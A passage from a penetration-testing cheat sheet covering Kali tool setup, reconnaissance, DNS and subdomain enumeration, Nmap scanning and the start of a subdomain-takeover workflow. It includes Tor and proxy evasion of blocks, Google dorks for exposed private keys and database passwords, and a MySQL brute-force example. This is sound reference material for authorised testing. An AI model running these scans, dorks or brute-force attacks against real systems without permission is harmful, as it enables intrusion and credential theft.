# Penetration Testing Cheat Sheet

This is more of a checklist for myself. May contain useful tips and tricks.

Everything was tested on Kali Linux v2022.3 (64-bit).

For help with any of the tools write `<tool_name> [-h | -hh | --help]` or `man <tool_name>`.

Sometimes `-h` can be mistaken for a host or some other option. If that's the case, use `-hh` or `--help` instead, or read the manual with `man`.

Some tools do similar tasks, but get slightly different results. Run everything you can.

Keep in mind when no protocol nor port number in a URL is specified, i.e. if you specify only `somesite.com`, some tools will default to HTTP protocol and port 80.

If you didn't already, read [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg). Checklist can be downloaded [here](https://github.com/OWASP/wstg/tree/master/checklists).

Highly recommend reading [Common Security Issues in Financially-Orientated Web](https://research.nccgroup.com/wp-content/uploads/2020/07/common_security_issues_in_financially-orientated_web.pdf).

Websites that you should use while writing the report:

* [cwe.mitre.org/data](https://cwe.mitre.org/data)
* [owasp.org/projects](https://owasp.org/projects)
* [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten)
* [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/Glossary.html)
* [nvd.nist.gov/vuln-metrics/cvss/v3-calculator](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator)
* [nvd.nist.gov/ncp/repository](https://nvd.nist.gov/ncp/repository)
* [attack.mitre.org](https://attack.mitre.org)

Future plans:

* more email gathering tools,
* Bash one-liner to transform `people.txt` into `emails.txt`, and `emails.txt` into `usernames.txt`,
* Subfinder and Findomain tools,
* more vulnerability scanning examples using NSE,
* more WordPress tools,
* HTTP smuggling,
* parameter pollution,
* email injection,
* insecure object deserialization,
* create an ASP/ASP.NET web shell,
* pre-shared key cracking,
* email spoofing.

My other cheat sheets:

* [WiFi Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/wifi-penetration-testing-cheat-sheet)
* [iOS Penetration Testing Cheat Sheet](https://github.com/ivan-sincek/ios-penetration-testing-cheat-sheet)
* [Android Testing Cheat Sheet](https://github.com/ivan-sincek/android-penetration-testing-cheat-sheet)

## Table of Contents

**0. [Install Tools](#0-install-tools)**

* [ProxyChains-NG](#proxychains-ng)

**1. [Reconnaissance](#1-reconnaissance)**

* [Useful Websites](#11-useful-websites)
* [Dmitry](#dmitry)
* [theHarvester](#theharvester)
* [uncover](#uncover)
* [FOCA](#foca-fingerprinting-organizations-with-collected-archives)
* [assetfinder](#assetfinder)
* [Sublist3r](#sublist3r)
* [Amass](#amass)
* [dig](#dig)
* [Fierce](#fierce)
* [DNSRecon](#dnsrecon)
* [host](#host)
* [httpx](#httpx)
* [gau](#gau)
* [snallygaster](#snallygaster)
* [Google Dorks](#google-dorks)
* [Chad](#chad)
* [Directory Fuzzing](#directory-fuzzing)
* [DirBuster](#dirbuster)
* [feroxbuster](#feroxbuster)
* [Bypassing 401 and 403](#bypassing-401-and-403)
* [urlhunter](#urlhunter)
* [Parsero](#parsero)
* [WhatWeb](#whatweb)
* [EyeWitness](#eyewitness)
* [Wordlists](#wordlists)

**2. [Scanning/Enumeration](#2-scanningenumeration)**

* [Useful Websites](#21-useful-websites)
* [Nmap](#nmap)
* [Nikto](#nikto)
* [WPScan](#wpscan)
* [testssl.sh](#testsslsh)
* [OpenSSL](#openssl)

**3. [Gaining Access/Exploiting](#3-gaining-accessexploiting)**

* [Useful Websites](#31-useful-websites)
* [Collaborator Servers](#collaborator-servers)
* [Subdomain Takeover](#subdomain-takeover)
* [Subzy](#subzy)
* [subjack](#subjack)
* [Nuclei](#Nuclei)
* [dotdotpwn](#dotdotpwn)
* [HTTP Response Splitting](#http-response-splitting)
* [Cross-Site Scripting \(XSS\)](#cross-site-scripting-xss)
* [SQL Injection](#sql-injection)
* [sqlmap](#sqlmap)
* [Web Shells](#web-shells)
* [Send Payload With Python](#send-payload-with-python)

**4. [Post Exploitation](#4-post-exploitation)**

* [Useful Websites](#41-useful-websites)
* [Generate a Reverse Shell Payload for Windows OS](#generate-a-reverse-shell-payload-for-windows-os)
* [PowerShell Encoded Command](#powershell-encoded-command)

**5. [Password Cracking](#5-password-cracking)**

* [Useful Websites](#51-useful-websites)
* [crunch](#crunch)
* [hash-identifier](#hash-identifier)
* [Hashcat](#hashcat)
* [Hydra](#hydra)
* [Password Spraying](#password-spraying)

**6. [Social Engineering](#6-social-engineering)**

* [Drive-by Download](#drive-by-download)
* [Phishing Website](#phishing-website)

**7. [Miscellaneous](#7-miscellaneous)**

* [Useful Websites](#71-useful-websites)
* [cURL](#curl)
* [Ncat](#ncat)
* [multi/handler](#multihandler)
* [ngrok](#ngrok)
* [Additional References](#additional-references)

## 0. Install Tools

Most of the tools can be installed with Linux package manager:

```bash
apt-get update && apt-get install -y sometool
```

For more information visit [www.kali.org/tools](https://www.kali.org/tools).

---

Some tools need to be downloaded and installed with Python:

```fundamental
python3 setup.py install
```

---

Some tools need to be downloaded and build with Golang, or installed directly:

```bash
go build sometool.go

go install -v github.com/user/sometool@latest
```

To set up Golang run `apt-get install -y golang`, add the following lines to `~/.zshrc`, then, run `source ~/.zshrc`:

```fundamental
export GOROOT=/usr/lib/go
export GOPATH=$HOME/go
export PATH=$GOPATH/bin:$GOROOT/bin:$PATH
```

If you use other console, you might need to write these lines to `~/.bashrc`, etc.

---

Some tools that are in the form of binaries or shell scripts can be moved to `/usr/bin/` for the ease of use:

```bash
mv sometool.sh /usr/bin/sometool && chmod +x /usr/bin/sometool
```

### ProxyChains-NG

If Google or any other search engine or service blocks your tool, use ProxyChains-NG and Tor to bypass restrictions.

Installation:

```bash
apt-get update && apt-get install -y proxychains4 tor torbrowser-launcher
```

Do the following changes to `/etc/proxychains4.conf`:

```
round_robin
chain_len = 1
proxy_dns
remote_dns_subnet 224
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 9050
```

Make sure to comment any chain type other than `round_robin` - e.g. comment `strict_chain`.

Don't forget to start Tor:

```fundamental
service tor start
```

Then, run any tool you want:

```fundamental
proxychains4 sometool
```

Using only Tor most likely won't be enough, you will need to add more [proxies](https://spys.one/en/socks-proxy-list) to `/etc/proxychains4.conf`; although, it is hard to find free proxies that are stable enough and not already blocked.

## 1. Reconnaissance

Keep in mind that some websites are accessible only through older web browsers like Internet Explorer.

Keep in mind that some websites may be missing the index page and may not redirect you to the home page at all. If that's the case, try to manually guess a full path to the home page, use [wayback machine](https://archive.org) ([getallurls](#getallurls)) to find old URLs, or try directory fuzzing with [DirBuster](#dirbuster).

Search the Internet for default paths and files for a specific web application. Use the information gathered in combination with [Google Dorks](#google-dorks) or [httpx](#httpx) to find the same paths/files on different websites. For not so common web applications, try to find and browse the source code for default paths/files.

You can find the application's source code on [GitHub](https://github.com), [GitLab](https://about.gitlab.com), [searchcode](https://searchcode.com), etc.

Search the application's source code for API keys, SSH keys, credentials, tokens, hidden endpoints and domains, etc.

Inspect the web console for possible errors. Inspect the application's source code for possible errors and comments.

**Don't forget to access a web server over an IP address because you may find server's default welcome page or some other content.**

### 1.1 Useful Websites

* [whois.domaintools.com](https://whois.domaintools.com)
* [reverseip.domaintools.com](https://reverseip.domaintools.com) (web-based reverse DNS lookup)
* [lookup.icann.org](https://lookup.icann.org)
* [sitereport.netcraft.com](https://sitereport.netcraft.com)
* [searchdns.netcraft.com](https://searchdns.netcraft.com) (web-based DNS lookup)
* [spyse.com](https://spyse.com)
* [search.censys.io](https://search.censys.io)
* [crt.sh](https://crt.sh) (certificate fingerprinting)
* [commoncrawl.org](https://commoncrawl.org/the-data/get-started) (web crawl dumps)
* [opendata.rapid7.com](https://opendata.rapid7.com) (scan dumps)
* [searchcode.com](https://searchcode.com)
* [virustotal.com](https://www.virustotal.com/gui/home/search)
* [isithacked.com](http://isithacked.com)
* [threatcrowd.org](https://www.threatcrowd.org)
* [haveibeenpwned.com](https://haveibeenpwned.com)
* [intelx.io](https://intelx.io) (database breaches)
* [search.wikileaks.org](https://search.wikileaks.org)
* [archive.org](https://archive.org) (wayback machine)
* [pgp.circl.lu](https://pgp.circl.lu) (OpenPGP key server)
* [shodan.io](https://www.shodan.io) (IoT search engine)

### Dmitry

Gather information:

```fundamental
dmitry -win somedomain.com | tee dmitry_results.txt
```

### theHarvester

Gather information:

```fundamental
theHarvester -f theharvester_results.xml -b anubis,baidu,bing,duckduckgo,google,yahoo,linkedin,trello,trello,twitter -l 500 -d somedomain.com
```

Sometimes the output file might default to `/usr/lib/python3/dist-packages/theHarvester/` directory.

Extract hostnames from the results:

```bash
grep -Po '(?<=\<hostname\>)[^\s]+?(?=\<\/hostname\>)' theharvester_results.xml | sort -uf | tee -a subdomains.txt
```

Extract emails from the results:

```bash
grep -Po '(?<=\<email\>)[^\s]+?(?=\<\/email\>)' theharvester_results.xml | sort -uf | tee -a emails.txt
```

### uncover

To download and install the tool, run:

```bash
go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest
```

Register and get your free API keys on [Shodan](https://www.shodan.io) and [Censys](https://search.censys.io/api).

Set your API keys in `/root/.config/uncover/provider-config.yaml` as following:

```fundamental
shodan:
  - SHODAN_API_KEY
censys:
  - CENSYS_API_ID:CENSYS_API_SECRET
fofa: []
```

Gather information:

```fundamental
uncover -nc -json -o uncover_results.json -l 100 -e shodan,censys -q somedomain.com

jq '.host | select (. != "")'' uncover_results.json | sort -uf | tee -a subdomains.txt

jq '.ip | select (. != "")'' uncover_results.json | sort -uf | tee -a ips.txt
```

### FOCA (Fingerprinting Organizations with Collected Archives)

Find metadata and hidden information in files.

Tested on Windows 10 Enterprise OS (64-bit).

Setup:

* download and install [MS SQL Server 2014 Express](https://www.microsoft.com/en-us/download/details.aspx?id=42299) or greater,
* download and install [MS .NET Framework 4.7.1 Runtime](https://dotnet.microsoft.com/download/dotnet-framework/net471) or greater,
* download and install [MS Visual C++ 2010 (64-bit)](https://www.microsoft.com/en-us/download/developer-tools.aspx) or greater,
* download and install [FOCA](https://github.com/ElevenPaths/FOCA/releases).

GUI is very intuitive.

### assetfinder

Enumerate subdomains using OSINT:

```bash
assetfinder --subs-only somedomain.com | grep -v '*' | tee assetfinder_results.txt
```

### Sublist3r

Enumerate subdomains using OSINT:

```fundamental
sublist3r -o sublister_results.txt -d somedomain.com
```

### Amass

Gather information:

```fundamental
amass enum -passive -o amass_results.txt -d somedomain.com
```

### dig

Fetch name servers:

```fundamental
dig +noall +answer -t NS somedomain.com
```

Fetch exchange servers:

```fundamental
dig +noall +answer -t MX somedomain.com
```

Interrogate a specified domain name server:

```fundamental
dig +noall +answer -t ANY somedomain.com @ns.somedomain.com
```

Fetch the zone file for a specified domain name server:

```fundamental
dig +noall +answer -t AXFR somedomain.com @ns.somedomain.com
```

Reverse DNS lookup:

```fundamental
dig +noall +answer -x 192.168.8.5
```

### Fierce

Interrogate domain name servers:

```fundamental
fierce -file fierce_std_results.txt --domain somedomain.com

fierce -file fierce_brt_results.txt --subdomain-file subdomains-top1mil.txt --domain somedomain.com
```

By default, Fierce will perform brute force attack with its built-in wordlist.

### DNSRecon

Interrogate domain name servers:

```fundamental
dnsrecon -t std --json /root/Desktop/dnsrecon_std_results.json -d somedomain.com

dnsrecon -t axfr --json /root/Desktop/dnsrecon_axfr_results.json -d somedomain.com

dnsrecon -v --iw -f --lifetime 3 --threads 50 -t brt --json /root/Desktop/dnsrecon_brt_results.json -D subdomains-top1mil.txt -d somedomain.com
```

DNSRecon can perform a brute force attack with a user-defined wordlist, but make sure to specify a full path to the wordlist; otherwise, DNSRecon might not recognize it.

Make sure to specify a full path to the output file; otherwise, it will default to `/usr/share/dnsrecon/` directory (i.e. to the root directory).

Extract hostnames from the standard/zone transfer/brute force results:

```bash
jq -r '.[] | if (.type == "A" or .type == "AAAA" or .type == "CNAME" or .type == "PTR" or .type == "NS" or .type == "MX") then (.name, .target, .exchange) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a subdomains.txt
```

Extract IPs from the standard/zone transfer/brute force results:

```bash
jq -r '.[] | if (.type == "A" or .type == "CNAME" or .type == "PTR" or .type == "NS" or .type == "MX") then (.address) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a ips.txt
```

Extract canonical names for the subdomain takeover vulnerability from the standard/zone transfer/brute force results:

```bash
jq -r '.[] | if (.type == "CNAME") then (.target) else (empty) end | select(. != null)' dnsrecon_std_results.json | sort -uf | tee -a cnames.txt
```

Reverse DNS lookup:

```fundamental
dnsrecon --json /root/Desktop/dnsrecon_reverse_results.json -s -r 192.168.8.0/24
```

Extract virtual hosts from the reverse DNS lookup results:

```bash
jq -r '.[] | if (type == "array") then (.[].name) else (empty) end | select(. != null)' dnsrecon_reverse_results.json | sort -uf | tee -a subdomains.txt
```

### host

Gather IPs for the given domains/subdomains (ask for `A` records):

```bash
for subdomain in $(cat subdomains.txt); do res=$(host -t A "${subdomain}" | grep -Po '(?<=has\ address\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_to_ips.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_to_ips.txt | sort -uf | tee -a ips.txt
```

Check if domains/subdomains are alive with [httpx](#httpx).

Gather virtual hosts for the given IPs (ask for `PTR` records):

```bash
for ip in $(cat ips.txt); do res=$(host -t PTR "${ip}" | grep -Po '(?<=domain\ name\ pointer\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_subdomains.txt

grep -Po '(?<=\|\ )[^\s]+' ips_to_subdomains.txt | sort -uf | tee -a subdomains.txt
```

Gather canonical names for the given domains/subdomains (ask for `CNAME` records):

```bash
for subdomain in $(cat subdomains.txt); do res=$(host -t PTR "${subdomain}" | grep -Po '(?<=is\ an\ alias\ for\ )[^\s]+(?<!\.)'); if [[ ! -z $res ]]; then echo "${subdomain} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a subdomains_to_cnames.txt

grep -Po '(?<=\|\ )[^\s]+' subdomains_to_cnames.txt | sort -uf | tee -a cnames.txt
```

### httpx

Installation:

```bash
apt-get update && apt-get install -y httpx-toolkit
```

Check if domains/subdomains are alive or not:

```bash
httpx-toolkit -o subdomains_live.txt -l subdomains.txt

httpx-toolkit -random-agent -json -o httpx_results.json -threads 100 -timeout 3 -l subdomains.txt -ports 80,443,8008,8080,8403,8443,9008,9080,9403,9443
```

Extract domains/subdomains from JSON results:

```bash
jq -r '.url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_live_long.txt

grep -Po 'http\:\/\/[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_long_http.txt

grep -Po 'https\:\/\/[^\s]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live_long_https.txt

grep -Po '(?<=\:\/\/)[^\s\:]+' subdomains_live_long.txt | sort -uf | tee -a subdomains_live.txt

jq -r 'select(."status-code" >= 200 and ."status-code" < 300) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_2xx.txt

jq -r 'select(."status-code" >= 300 and ."status-code" < 400) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_3xx.txt

jq -r 'select(."status-code" < 300 or ."status-code" >= 400) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_3xx_none.txt

jq -r 'select(."status-code" >= 400 and ."status-code" < 500) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_4xx.txt

jq -r 'select(."status-code" == 401) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_401.txt

jq -r 'select(."status-code" == 403) | .url | select(. != null)' httpx_results.json | sort -uf | tee -a subdomains_403.txt
```

Check if a specified path exists:

```bash
httpx-toolkit -status-code -content-length -o httpx_results.txt -l subdomains_live.txt -path /somepath/
```

### gau

Installation:

```bash
apt-get update && apt-get install -y getallurls
```

Get URLs from [wayback machine](https://archive.org):

```fundamental
getallurls somedomain.com | tee gau_results.txt

for subdomain in $(cat subdomains_live.txt); do getallurls "${subdomain}"; done | sort -uf | tee gau_results.txt
```

Filter URLs from the results:

```bash
httpx-toolkit -random-agent -json -o httpx_gau_results.json -threads 100 -timeout 3 -l gau_results.txt

jq -r 'select(."status-code" >= 200 and ."status-code" < 300) | .url | select(. != null)' httpx_gau_results.json | sort -uf | tee gau_2xx_results.txt

jq -r 'select(."status-code" >= 300 and ."status-code" < 400) | .url | select(. != null)' httpx_gau_results.json | sort -uf | tee gau_3xx_results.txt

jq -r 'select(."status-code" >= 400) | .url | select(. != null)' httpx_gau_results.json | sort -uf | tee gau_4xx_results.txt

jq -r 'select(."status-code" == 401) | .url | select(. != null)' httpx_gau_results.json | sort -uf | tee gau_401_results.txt

jq -r 'select(."status-code" == 403) | .url | select(. != null)' httpx_gau_results.json | sort -uf | tee gau_403_results.txt
```

### snallygaster

Download the latest version from [GitHub](https://github.com/hannob/snallygaster/releases). See how to [install](#0-install-tools) the tool.

Search a web server for sensitive files:

```bash
snallygaster --nowww somesite.com | tee snallygaster_results.txt

for subdomain in $(cat subdomains_live_long_http.txt); do snallygaster --nohttps --nowww "${subdomain}"; done | tee snallygaster_http_results.txt

for subdomain in $(cat subdomains_live_long_https.txt); do snallygaster --nohttp --nowww "${subdomain}"; done | tee snallygaster_https_results.txt
```

### Google Dorks

Google Dorks databases:

* [exploit-db.com/google-hacking-database](https://www.exploit-db.com/google-hacking-database)
* [cxsecurity.com/dorks](https://cxsecurity.com/dorks)
* [pentest-tools.com/information-gathering/google-hacking](https://pentest-tools.com/information-gathering/google-hacking)
* [github.com/opsdisk/pagodo/blob/master/dorks/all_google_dorks.txt](https://github.com/opsdisk/pagodo/blob/master/dorks/all_google_dorks.txt)

Check the list of `/.well-known/` files [here](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml).

Google Dorks will not show directories nor files that are disallowed in `robots.txt`, to check for such directories and files use [httpx](#httpx).

Append `site:somedomain.com` to limit your scope to a specified domain or `site:*.somedomain.com` to limit your scope only to subdomains.

Simple Google Dorks examples:

```fundamental
inurl:/robots.txt intext:disallow ext:txt

inurl:/.well-known/security.txt ext:txt

inurl:/info.php intext:"php version" ext:php

intitle:"index of /" intext:"parent directory"

intitle:"index of /.git" intext:"parent directory"

inurl:/gitweb.cgi

intitle:"Dashboard [Jenkins]"

(intext:"mysql database" AND intext:db_password) ext:txt

intext:-----BEGIN PGP PRIVATE KEY BLOCK----- (ext:pem OR ext:key OR ext:txt)
```

### Chad

Find and download specified files using Google Dorks:

```fundamental
chad -sos no -d chad_results -tr 100 -q "ext:txt OR ext:pdf OR ext:doc OR ext:docx OR ext:xls OR ext:xlsx" -s *.somedomain.com -o chad_results.json
```

Extract authors from the files:

```bash
apt-get install -y libimage-exiftool-perl

exiftool chad_results | grep -Po 'Author.+(?<=\:)[\s]+\K.+' | sort -uf | tee -a people.txt
```

Run a single Google Dork:

```fundamental
chad -sos no -q 'intitle:"index of /" intext:"parent directory"' -s *.somedomain.com
```

For advanced use and automation, check the [project page](https://github.com/ivan-sincek/chad).

### Directory Fuzzing

**Don't forget that GNU/Linux OS has a case sensitive file system, so make sure to use an appropriate wordlists.**

Find out how to bypass 4xx HTTP response status codes from my other [project](https://github.com/ivan-sincek/forbidden).

The following tools might take a long time to finish depending on the settings and wordlist used. All of them also support recursive directory search.

### DirBuster

Brute force directories and file names on a web server.

<p align="center"><img src="https://github.com/ivan-sincek/penetration-testing-cheat-sheet/blob/master/img/dirbuster.png" alt="DirBuster"></p>

<p align="center">Figure 1 - DirBuster</p>

All DirBuster's wordlists are located at `/usr/share/dirbuster/wordlists/` directory.

### feroxbuster

Installation:

```bash
apt-get update && apt-get install -y feroxbuster
```

Brute force directories on a web server:

```fundamental
cat subdomains_live_long.txt | feroxbuster --stdin --auto-bail -k -n -t 50 -T 3 -s 200 301 302 401 403 -w directory-list-2.3-medium.txt | tee feroxbuster_results.txt
```

This tool seems to be faster than [DirBuster](#dirbuster).

Filter directories from the results:

```bash
grep -Po '(?<=200)\K.+\K(?<=c\ )[^\s]+' feroxbuster_results.txt | sort -uf | tee -a directories_200.txt

grep -Po '(?<=301|302)\K.+\K(?<=c\ )[^\s]+' feroxbuster_results.txt | sort -uf | tee -a directories_3xx.txt

grep -Po '(?<=401)\K.+\K(?<=c\ )[^\s]+' feroxbuster_results.txt | sort -uf | tee -a directories_401.txt

grep -Po '(?<=403)\K.+\K(?<=c\ )[^\s]+' feroxbuster_results.txt | sort -uf | tee -a directories_403.txt
```

### Bypassing 401 and 403

Find out how to bypass 4xx HTTP response status codes from my other [project](https://github.com/ivan-sincek/forbidden).

### urlhunter

To download and install the tool, run:

```bash
go install -v github.com/utkusen/urlhunter@latest
```

Get URLs from URL shortening services:

```fundamental
urlhunter -o urlhunter_results.txt -date latest -keywords keywords.txt
```

### Parsero

Test all `robots.txt` entries:

```fundamental
parsero -sb -u somesite.com
```

### WhatWeb

Identify a website:

```fundamental
whatweb -v somesite.com
```

### EyeWitness

Installation:

```bash
apt-get update && apt-get install -y eyewitness
```

Grab screenshots from websites:

```fundamental
eyewitness --no-dns --no-prompt -d eyewitness_results -f subdomains_live_long.txt
```

To check the screenshots, navigate to `eyewitness_results/screens` directory.

### Wordlists

Download a useful collection of multiple types of lists for security assessments.

Installation:

```bash
apt-get update && apt-get install -y seclists
```

Lists will be stored at `/usr/share/seclists/`.

Or, manually download the collection from [GitHub](https://github.com/danielmiessler/SecLists/releases). Some antiviruses will try to block download, it is false positive detection.

Another popular wordlist collections:

* [xmendez/wfuzz](https://github.com/xmendez/wfuzz)
* [assetnote/commonspeak2-wordlists](https://github.com/assetnote/commonspeak2-wordlists)
* [weakpass.com/wordlist](https://weakpass.com/wordlist)
* [packetstormsecurity.com/Crackers/wordlists](https://packetstormsecurity.com/Crackers/wordlists)

## 2. Scanning/Enumeration

Keep in mind that web applications can be hosted on other ports besides 80 (HTTP) and 443 (HTTPS), e.g. they can be hosted on port 8443 (HTTPS).

Keep in mind that on ports 80 (HTTP) and 443 (HTTPS) a web server can host different web applications or some other services entirely. Use [Ncat](#ncat) or Telnet for banner grabbing.

Keep in mind that on different URL paths a web server can host different web applications or some other services entirely, e.g. `somesite.com/app_one/` and `somesite.com/app_two/`.

While scanning for vulnerabilities or running any other intensive scans, periodically check the web application/service in case it crashed so you can alert your client as soon as possible. Also, many times you might get temporarily blocked by the web application firewall (WAF) or some other security product and all your subsequent requests will be invalid.

If a web application all of sudden stops responding, try to access the web application with your mobile data (i.e. use a different IP). It is possible that your current IP was temporarily blocked.

Send an email message to a non-existent address at a target domain, it will often reveal useful internal network information through a nondelivery notification (NDN).

Try to invest into [Nessus Professional](https://www.tenable.com/products/nessus) and [Burp Suite Professional](https://portswigger.net/burp) or any other similar permium tools if you can afford them.

### 2.1 Useful Websites

* [ipaddressguide.com/cidr](https://www.ipaddressguide.com/cidr)
* [calculator.net/ip-subnet-calculator.html](https://www.calculator.net/ip-subnet-calculator.html)
* [speedguide.net/ports.php](https://www.speedguide.net/ports.php)
* [securityheaders.com](https://securityheaders.com)
* [csp-evaluator.withgoogle.com](https://csp-evaluator.withgoogle.com) (Content Security Policy evaluator)

### Nmap

**For better results, use IPs instead of domain names.**

Ping sweep (map live hosts):

```bash
nmap -sn -oG nmap_ping_sweep_results.txt 192.168.8.0/24

nmap -sn -oG nmap_ping_sweep_results.txt -iL cidr.txt
```

Extract live hosts from the results:

```bash
grep -Po '(?<=Host\:\ )[^\s]+' nmap_ping_sweep_results.txt | sort -uf | tee -a ips.txt
```

TCP scan (all ports):

```fundamental
nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- 192.168.8.0/24

nmap -nv -sS -sV -sC -Pn -oN nmap_tcp_results.txt -p- -iL cidr.txt
```

\[Variation\] TCP scan (all ports):

```bash
mkdir nmap_tcp_results

for ip in $(cat ips.txt); do nmap -nv -sS -sV -sC -Pn -oN "nmap_tcp_results/nmap_tcp_results_${ip//./_}.txt" -p- "${ip}"; done
```

UDP scan (only important ports):

```fundamental
nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 192.168.8.0/24

nmap -nv -sU -sV -sC -Pn -oN nmap_udp_results.txt -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 -iL cidr.txt
```

\[Variation\] UDP scan (only important ports):

```bash
mkdir nmap_udp_results

for ip in $(cat ips.txt); do nmap -nv -sU -sV -sC -Pn -oN "nmap_udp_results/nmap_udp_results_${ip//./_}.txt" -p 53,67,68,69,88,123,135,137,138,139,161,162,389,445,500,514,631,1900,4500 "${subdomain}"; done
```

| Option | Description |
| --- | --- |
| -sn | Ping scan - disable port scan |
| -Pn | Treat all hosts as online -- skip host discovery |
| -n/-R | Never do DNS resolution/Always resolve (default: sometimes) |
| -sS/sT/sA | TCP SYN/Connect()/ACK |
| -sU | UDP scan |
| -p/-p- | Only scan specified ports/Scan all ports |
| --top-ports | Scan <number> most common ports |
| -sV | Probe open ports to determine service/version info |
| -O | Enable OS detection |
| -sC | Same as --script=default |
| --script | Script scan (takes time to finish) |
| --script-args | Provide arguments to scripts |
| --script-help | Show help about scripts |
| -oN/-oX/-oG | Output scan in normal, XML, and Grepable format |
| -v | Increase verbosity level (use -vv or more for greater effect) |
| --reason | Display the reason a port is in a particular state |
| -A | Enable OS detection, version detection, script scanning, and traceroute |

All Nmap's scripts are located at `/usr/share/nmap/scripts/` directory. Read more about the scripts [here](https://nmap.org/nsedoc).

NSE examples:

```fundamental
nmap -nv --script='mysql-brute' --script-args='userdb="users.txt", passdb="rockyou.txt"' 192.168.8.5 -p 3306

nmap -nv --script='dns-brute' --script-args='dns-brute.domain="somedomain.com", dns-brute.hostlist="subdomains-top1mil.txt"'

nmap -nv --script='ssl-heartbleed' -iL cidr.txt
```

You can find `rockyou.txt` and `subdomains-top1mil.txt` wordlists in [SecLists](#wordlists).

### Nikto

Scan a web server:

```fundamental
nikto -output nikto_results.txt -h somesite.com -p 80
```

### WPScan

Scan a WordPress website:

```fundamental
wpscan -o wpscan_results.txt --url somesite.com
```

### testssl.sh

Installation:

```bash
apt-get update && apt-get install -y testssl.sh
```

Test an SSL/TLS certificate (i.e. SSL/TLS ciphers, protocols, etc.):

```fundamental
testssl --openssl /usr/bin/openssl -oH testssl_results.html somesite.com
```

You can also use testssl.sh to exploit SSL/TLS vulnerabilities.

### OpenSSL

Test a web server for Heartbleed vulnerability:

```bash
for subdomain in $(cat subdomains_live.txt); do res=$(echo "Q" | openssl s_client -connect "${subdomain}:443" 2>&1 | grep 'server extension "heartbeat" (id=15)'); if [[ ! -z $res ]]; then echo "${subdomain}"; fi; done | tee openssl_heartbleed_results.txt

for subdomain in $(cat subdomains_live_long_https.txt); do res=$(echo "Q" | openssl s_client -connect "${subdomain}" 2>&1 | grep 'server extension "heartbeat" (id=15)'); if [[ ! -z $res ]]; then echo "${subdomain}"; fi; done | tee openssl_heartbleed_results.txt
```

## 3. Gaining Access/Exploiting

Always try the null session login (i.e. no password login) or search the Internet for default credentials for a specific web application.

Try to manipulate cookies or tokens to gain access or elevate privileges.

Try to change an HTTP POST request into an HTTP GET request (i.e. into a query string) and see if a server will accept it.

Turn off JavaScript in your web browser and check the web application behaviour again.

Check the web application behaviour on mobile devices, e.g. check `m.somesite.com` for vulnerabilities because some features might work differently.

If you want to automate your code injection testing, check the [Wordlists](#wordlists) sub-section for code injection wordlists. Most of the wordlists also include obfuscated code injections.

**Don't forget to remove all the created artifacts after you are done testing.**

### 3.1 Useful Websites

* [cvedetails.com](https://www.cvedetails.com)
* [securityfocus.com/vulnerabilities](https://www.securityfocus.com/vulnerabilities)
* [exploit-db.com](https://www.exploit-db.com)
* [cxsecurity.com](https://cxsecurity.com/wlb)
* [xssed.com](http://www.xssed.com)
* [xss-payloads.com](http://www.xss-payloads.com/payloads-list.html?a#category=all) (advanced XSS PoCs)
* [hakluke/weaponised-XSS-payloads](https://github.com/hakluke/weaponised-XSS-payloads)
* [namecheap.com](https://www.namecheap.com) (buy domains for cheap)
* [streaak/keyhacks](https://github.com/streaak/keyhacks) (validate API keys)
* [swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
* [jwt.io](https://jwt.io)

### Collaborator Servers

Exploit open redirect, blind cross-site scripting (XSS), DNS/HTTP interaction, etc.

* [interactsh.com](https://app.interactsh.com)
* [dnslog.cn](http://dnslog.cn)
* [Burp Collaborator](https://portswigger.net/burp/documentation/collaborator)
* [canarytokens.org](https://canarytokens.org/generate)
* [webhook.site](https://webhook.site)
	
### Subdomain Takeover

Gather as much information as you can for a target domain, see how in [1. Reconnaissance](#1-reconnaissance).

Gather organization's names for the given IPs (search for `WHOIS` records):

```bash
for ip in $(cat ips.txt); do res=$(whois "${ip}" | grep -Po '(?<=org-name\:)[\s]+\K.+'); if [[ ! -z $res ]]; then echo "${ip} | ${res//$'\n'/ | }"; fi; done | sort -uf | tee -a ips_to_organization_names.txt

grep -Po '(?<=\|\ )(?(?!\ \|).)+' ips_to_organization_names.txt | sort -uf | tee -a organization_names.txt
```

Check if any IP belongs to [GitHub](https://github.com) organization.

Gather canonical names with [host](#host).

Check if domains/subdomains are dead or not, look for `NXDOMAIN`, `SERVFAIL`, or `REFUSED` status codes:

```bash
for subdomain in $(cat subdomains.txt); do res=$(dig "${subdomain}" A +noall +comments +timeout=3 | grep -Po '(?<=status\:)[\s]+\K[^\s\,]+'); echo "${subdomain} | ${res}"; done | sort -uf | tee -a subdomains_to_status.txt

grep -v 'NOERROR' subdomains_to_status.txt | grep -Po '[^\s]+(?=\ \|)' | sort -uf | tee -a subdomains_error.txt

